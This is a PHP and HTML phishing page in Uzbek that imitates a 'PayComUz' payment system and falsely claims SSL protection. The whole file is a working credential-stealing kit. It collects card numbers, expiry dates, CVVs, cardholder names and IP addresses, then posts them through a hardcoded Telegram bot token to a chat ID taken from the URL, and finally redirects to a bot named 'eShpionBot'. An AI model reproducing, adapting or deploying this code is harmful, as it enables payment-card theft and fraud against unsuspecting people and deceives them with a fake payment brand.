<?php
// domen.name/rm/123456789 formatida ishlaydi

// URL dan user_id ni olish
$path = $_SERVER['REQUEST_URI'];
$parts = explode('/', trim($path, '?'));

if (count($parts) >= 2) {
    $user_id = end($parts);
} else {
    $user_id = $_GET['id'] ?? '';
}

if(empty($user_id) || !is_numeric($user_id)) {
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}


if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = $_POST['card_number'] ?? '';
    $expiry = $_POST['expiry'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $cardholder = $_POST['cardholder'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Noma\'lum';
    
    if(!empty($card_number)) {
        $bot_token = "8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4";
        $chat_id = $user_id;
        
        $message = "💳 <b>Bank Kartasi Ma'lumotlari</b>\n\n";
        $message .= "🔢 <b>Karta Raqami:</b> <code>" . htmlspecialchars($card_number) . "</code>\n";
        $message .= "📅 <b>Muddati:</b> " . htmlspecialchars($expiry) . "\n";
        $message .= "🔐 <b>CVV:</b> " . htmlspecialchars($cvv) . "\n";
        $message .= "👤 <b>Karta egasi:</b> " . htmlspecialchars($cardholder) . "\n";
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
        $message .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
        $message .= "🆔 <b>User ID:</b> <code>$user_id</code>";
        
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
    
    header("Location: https://t.me/eShpionBot?start=true");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayComUz - To'lov tizimi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); width: 100%; max-width: 450px; overflow: hidden; }
        .header { background: linear-gradient(to right, #4facfe 0%, #00f2fe 100%); padding: 30px; text-align: center; color: white; }
        .header h1 { font-size: 28px; margin-bottom: 10px; }
        .header p { opacity: 0.9; }
        .content { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: border 0.3s; }
        .form-group input:focus { outline: none; border-color: #4facfe; }
        .row { display: flex; gap: 15px; }
        .row .form-group { flex: 1; }
        .btn { width: 100%; background: linear-gradient(to right, #4facfe 0%, #00f2fe 100%); color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
        .btn:hover { transform: translateY(-2px); }
        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; justify-content: center; align-items: center; z-index: 9999; flex-direction: column; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4facfe; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-form { display: none; }
        .payment-icons { display: flex; justify-content: center; gap: 15px; margin-top: 20px; }
        .payment-icons img { height: 30px; }
        .security-notice { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Tolov tizimiga kirilmoqda...</div>
    </div>

    <div id="mainContent" class="hidden-form">
        <div class="container">
            <div class="header">
                <h1>💳 PayComUz</h1>
                <p>Xavfsiz to'lov tizimi</p>
            </div>
            
            <div class="content">
                <form id="paymentForm" method="POST">
                    <div class="form-group">
                        <label>Karta raqami</label>
                        <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required maxlength="19" pattern="[0-9\s]{13,19}">
                    </div>
                    
                    <div class="row">
                        <div class="form-group">
                            <label>Muddati (OY/YIL)</label>
                            <input type="text" name="expiry" placeholder="MM/YY" required maxlength="5" pattern="(0[1-9]|1[0-2])\/[0-9]{2}">
                        </div>
                        <div class="form-group">
                            <label>CVV</label>
                            <input type="password" name="cvv" placeholder="123" required maxlength="3" pattern="[0-9]{3}">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Karta egasi</label>
                        <input type="text" name="cardholder" placeholder="Rasulov Sarvar" required>
                    </div>
                    
                    <button type="submit" class="btn">To'lov qilish</button>
                    
                    <div class="payment-icons">
                        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
                        <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="MasterCard">
                        <img src="https://img.icons8.com/color/48/000000/unionpay.png" alt="UnionPay">
                    </div>
                    
                    <div class="security-notice">
                        🔒 Barcha ma'lumotlar SSL shifrlash orqali himoyalangan
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        setTimeout(function() {
            document.getElementById('loadingOverlay').style.display = 'none';
            document.getElementById('mainContent').classList.remove('hidden-form');
            
            // Karta raqamini formatlash
            document.querySelector('[name="card_number"]').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.replace(/(.{4})/g, '$1 ').trim();
                e.target.value = value.substring(0, 19);
            });
            
            // Muddati formatlash
            document.querySelector('[name="expiry"]').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0,2) + '/' + value.substring(2,4);
                }
                e.target.value = value.substring(0, 5);
            });
            
            // CVV ni raqam qilish
            document.querySelector('[name="cvv"]').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
            });
            
            document.getElementById('paymentForm').addEventListener('submit', function(e) {
                e.preventDefault();
                this.submit();
            });
        }, 2000);
    </script>
</body>
</html>